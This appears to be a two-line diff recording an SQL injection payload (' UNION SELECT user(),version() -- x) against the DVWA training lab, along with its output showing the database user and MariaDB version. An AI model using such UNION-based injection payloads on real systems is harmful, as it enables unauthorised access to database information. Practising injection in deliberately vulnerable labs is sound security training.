@@ -1,0 +1,2 @@
+ID: ' UNION SELECT user(),version() -- xFirst name: dvwa@172.20.0.2Surname: 10.11.18-MariaDB-ubu2204
+ <<== ' UNION SELECT user(),version() -- x
